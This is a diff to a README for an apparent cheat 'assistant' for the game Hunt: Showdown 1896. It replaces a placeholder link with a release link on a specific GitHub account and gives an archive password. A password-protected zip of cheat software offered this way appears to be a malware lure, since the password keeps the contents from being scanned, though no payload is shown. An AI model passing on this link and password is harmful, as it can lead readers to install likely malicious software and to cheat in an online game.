@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Hunt-Showdown-1896-Ultimate-Assistant/releases/latest/download/HuntShowdown-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/kevinkimeng20b8/Hunt-Showdown-1896-Ultimate-Assistant/releases/download/download/HuntShowdown_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
